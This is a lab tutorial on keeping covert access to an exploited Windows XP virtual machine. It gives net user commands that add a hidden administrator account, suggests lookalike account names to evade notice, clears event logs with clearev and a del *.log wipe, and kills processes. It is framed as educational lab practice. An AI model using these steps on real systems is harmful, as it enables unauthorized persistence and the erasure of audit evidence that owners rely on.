@@ -1,0 +1,187 @@
+**********************************************
+Straightforward Training™
+Using Maintaining Persistence in Windows XP (Step #2)
+Author: Saulo S. Ortiz
+Date: 20190918
+Update: 20190921
+**********************************************
+
+DISCLAIMER
+1. These steps are for educational purposes only and for use at your own network laboratory. If you use these steps without consent from the network owner, you’re on your own.
+
+2. I am not responsible for any issues/damages to hardware or software by using any of the software mentioned in this guide or damages by following the steps…do so at your own risk. I have tested these steps myself and found no issues/damage to my own systems. Also, I am not responsible for software links, software availability or versions differences.
+
+3. You will need to have common Linux knowledge to be able to follow this guide as well as what an .iso file is; installing and configuring a Linux distro in a VM environment, general VM knowledge, and basic DOS commands. I will not be covering these steps in this short guide. This guide is NOT for people that have no idea how to install, remove, update/upgrade, and configure Linux/Windows OS or VMs. Google is your best friend and research is part of the job.
+
+COMMONS COMMANDS TO KNOW:
+•	ls		- Lists Files/folders (LS)
+•	cd		- Call Directory
+•	dir		- Lists files/folders (Windows)
+•	set
+•	net user
+
+LEGEND:
+•	Commands: 	Words in BOLD are commands
+•	Comments: 	Words in italic red are comments or additional commands
+•	Important: 	Words with asterisk lines are important notes or comments
+****************************************************
+
+DEFAULT LOGINS:
+•	Kali: root/toor
+
+WHAT YOU’LL NEED FOR THIS EXERCISE:
+•	A computer with minimum: 8GB RAM, 6 Core CPU and a HDD of 500GB
+o	Higher specs if you plan to run more than two VMs at a time
+•	ISO file of Windows XP without Windows Update MS08_067
+•	ISO file of the latest Kali release or any Linux distro that you want to update with the tools needed in this exercise.
+•	OracleVirtualbox (free) or VMWare Workstation 12 or higher
+
+******************************************************************************
+NOTE: When using a VM make sure you change your resolution to the highest you can use without having any scroll bars on the sides or the bottom of the screen.
+******************************************************************************
+
+INTRODUCTION:
+In this guide, we’ll be picking up from the previous guide (Metasploit into Windows XP). Don’t worry if you already cleared the logs, there will be more things recorded in them to clear before we complete these new steps.
+
+FYI…Just in case you may want to try similar steps in other Windows OSes below is the information to setup their VMs. I may or may not do steps for other Microsoft OSes in the future.
+
+******************************************************************************
+NOTE: If you try these steps on any OS above XP you’ll need to find their own particular vulnerabilities to exploit then continue from there.
+******************************************************************************
+
+SETUP:
+1.	Install the VM application you want, and then install Kali and any Windows ISO as VMs.
+2.	Give the VMs:
+a.	Windows XP = 1 CPU/1 Core, 1GB RAM and 8GB of HDD space.
+b.	Windows 7/8.1 (32bit) = 1 CPU/2 Cores, 2GB RAM, 20GB of HDD space.
+c.	Windows 7/8.1 (64bit) = 1 CPU/2 Cores, 4GB RAM, 24GB of HDD space.
+d.	Kali = 1 CPU/2, 4GB RAM and 40GB HDD space.
+3.	Maximize the GPU memory on both Kali and Windows.
+a.	Do not use 3D on any of them.
+4.	Make sure both VM networks are in NAT so they use the same network range. There is no need to be connected to the Internet for this to work.
+
+******************************************************************************
+NOTE: Now that you have compromised your Windows target, we need to make sure we can continue coming back for goodies every now and then without being detected. ******************************************************************************
+
+ATTACK:
+We’re going to maintain access to the Windows XP machine we exploited from the previous steps. If you don’t remember what you did and you’re not at that point, then you will need to review that guide and continue here. Otherwise continue below.
+
+Run both Kali and any Windows VMs.
+
+******************************************************************************
+NOTE: Make sure you’re capturing all logons…
+******************************************************************************
+
+1.	Go to Windows XP…
+a.	Click: Start > Control Panel > Administrative Tools > Local Security Policy
+b.	Click: Local Policies > Audit Policy
+c.	Select: Audit logon events and select both check boxes
+d.	Close and go to Event Viewer
+e.	Select: Security and live it open
+f.	Return to Kali
+
+******************************************************************************
+NOTE: If you haven’t spawned a shell to XP using metasploit do it now! Use the previous guide to get there.
+******************************************************************************
+
+2.	Do a Banner Grab…
+a.	Type: shell
+b.	Type: systeminfo
+i.	Not to be confused with sysinfo command
+ii.	Take notes!
+
+3.	Dig for more information…
+a.	Type: set
+i.	Take notes!
+
+4.	Find the user’s domain, name and profile location…
+a.	Type: set user
+i.	Notice something familiar?
+
+5.	Find out what accounts are active in the target…
+a.	Type: net user
+i.	These are the accounts in the system
+
+A thing I would like to try is to check which account hasn’t been used for a while in order to change the password. This could mean that the account was left over from a person that no longer works there and their account was never removed. I came upon this after reading “The Cuckoos Egg” by Cliff Stoll. I was amazed at the train of thought back in the day when everything was done in terminal and wondered if anything could still be used today.
+
+******************************************************************************
+NOTE: A highly recommended book if you love the Linux terminal. With that said…this is YOUR VM so you will NOT have an old user account sitting there unless you create one first.
+******************************************************************************
+
+6.	Find out what account hasn’t been used for a while…
+a.	Type: net user <account_name>
+i.	Look for “Last Logon” entry
+ii.	FYI…use net user ? to see all options
+
+If you’re familiar with phishing attacks then you’ll probably seen websites or account names that are similar to the real thing, but off by a character. When a person scans over them, they may miss it’s not the real account. Use something similar if you can but your VM only has the default ones. Something to keep in mind.
+
+
+******************************************************************************
+NOTE: Example names are: lancaster (1ancaster), Sandra (Sanda), Hawaii (Havvaii). If you can’t find one then use a name that it’s easy to remember, like: Mike Hunt, Hung Lo, Jack Mehoff…just don’t make it so obvious…or just use the name of something that’s in front of you.
+******************************************************************************
+
+7.	Create a new user account…
+a.	Type: net user susan /add
+
+8.	Check to see if Susan has administrator rights…
+a.	Type: net user susan
+i.	Look for the “Local Group Memberships” entry…it should read Administrator
+
+9.	Find the correct syntax for the command to add Susan to the Administrator group…
+a.	Type: net
+
+10.	Add susan to the administrators group…
+a.	Type: net localgroup administrators susan /add
+
+11.	Check to see if susan is an admin…
+a.	Type: net user susan
+
+12.	Change susan’s password…
+a.	Type: net user susan  <password>
+
+
+******************************************************************************
+NOTE: If you go into your Windows XP you will see nothing is out of place…all was done in the background and the user has no idea.
+******************************************************************************
+
+13.	While in XP check the logs in the Event viewer…
+a.	Open Security
+b.	Look for the Failure Audit and open any of them if you have more than one
+
+******************************************************************************
+NOTE: This is the security audit that will give you away and show to the admin someone is in the system…do you understand it?
+******************************************************************************
+
+14.	Run the Internet Explorer browser…
+
+15.	Return to the running shell in Kali…
+
+16.	Clear the logs in your target…
+a.	Exit the shell and in meterpreter…
+b.	Type: clearev
+
+******************************************************************************
+NOTE: I’ve tried using the command del *.log /a /s /q /f but no luck while services are running…the one above forces all to be deleted.
+******************************************************************************
+
+
+MISC STUFF:
+You can find the services running and kill them.
+
+While in the spawned shell…
+1.	Now find what services are running…
+a.	Type: tasklist
+
+2.	Find a service and kill it…
+a.	Type: taskkill /im iexplore.exe
+i.	If you cannot then use the -f flag to force it
+
+3.	Return to XP and notice the browser is gone…go back to the running shell…
+
+
+
+******************************************************************************
+NOTE: you can also kill services using their PID. Like: taskkill /PID 6984
+******************************************************************************
+
+Next stop…using your new account to log in remotely! Stay tuned!
